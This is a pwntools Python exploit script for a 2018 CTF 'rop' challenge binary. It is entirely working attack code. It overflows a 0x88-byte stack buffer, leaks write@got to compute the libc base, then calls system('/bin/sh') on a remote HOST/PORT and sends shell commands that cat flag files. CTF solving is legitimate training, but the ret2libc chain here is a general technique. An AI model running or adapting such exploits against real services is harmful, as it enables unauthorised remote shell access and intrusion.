from pwn import *
import os
import re
import ssl
import time

context.arch = "i386"
context.log_level = "info"

BIN = "./铁人三项（第五赛区）2018_rop"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "")

WRITE_PLT = 0x80483A0
WRITE_GOT = 0x804A010
MAIN = 0x80484C6

# vulnerable_function: char buf[0x88] @ ebp-0x88; saved EIP @ ebp+4
OFFSET = 0x88 + 4


def start():
    if args.LOCAL:
        ld = os.getenv("I386_LD")
        libpath = os.getenv("I386_LIBPATH")
        if ld:
            return process([ld, "--library-path", libpath, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 11_2018_rop_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def resolve_libc():
    path = LIBC_PATH
    if not path and args.LOCAL:
        libpath = os.getenv("I386_LIBPATH", "")
        if libpath:
            path = os.path.join(libpath, "libc.so.6")

    if not path:
        raise SystemExit(
            "[-] set LIBC=/path/to/libc.so.6, or use I386_LIBPATH for LOCAL"
        )

    return ELF(path, checksec=False)


def exploit():
    p = start()
    libc = resolve_libc()

    # Stage 1: write(1, write@got, 4), then re-enter main.
    stage1 = flat(
        b"A" * OFFSET,
        WRITE_PLT, MAIN, 1, WRITE_GOT, 4,
    )
    p.send(stage1)

    leak = u32(p.recvn(4))
    libc_base = leak - libc.symbols["write"]
    if libc_base & 0xFFF:
        raise SystemExit(
            f"[-] libc base {libc_base:#x} is not page aligned; "
            "LIBC does not match the target"
        )
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    log.success(
        f"write = {leak:#x}, libc = {libc_base:#x}, system = {system:#x}"
    )

    # Stage 2: system("/bin/sh").
    stage2 = flat(
        b"A" * OFFSET,
        system, 0xDEADBEEF, binsh,
    )
    p.send(stage2)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
